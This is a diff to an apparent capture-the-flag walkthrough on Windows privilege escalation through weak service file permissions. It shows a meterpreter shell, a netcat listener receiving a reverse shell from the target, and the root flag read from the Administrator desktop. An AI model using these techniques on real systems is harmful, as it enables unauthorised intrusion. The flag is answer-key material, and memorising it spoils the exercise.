@@ -231,7 +231,6 @@ Upload your binary and replace the legitimate one. Then restart the program to g
 Note: The service showed up as being unquoted (and could be exploited using this technique), however, in this case we have exploited weak file permissions on the service files instead.
 
 
-
     meterpreter > shell
     Process 1812 created.
     Channel 14 created.
@@ -304,3 +303,16 @@ Note: The service showed up as being unquoted (and could be exploited using this
 
 
     C:\Program Files (x86)\IObit>
+
+
+What is the root flag?
+
+    kali@kali:~/Hacking$ nc -lnvp 9002
+    Listening on 0.0.0.0 9002
+    Connection received on 10.10.208.51 49299
+    Microsoft Windows [Version 6.3.9600]
+    (c) 2013 Microsoft Corporation. All rights reserved.
+
+    C:\Windows\system32>type "C:\Users\Administrator\Desktop\root.txt
+    type "C:\Users\Administrator\Desktop\root.txt
+    9af5f314f57607c00fd09803a587db80
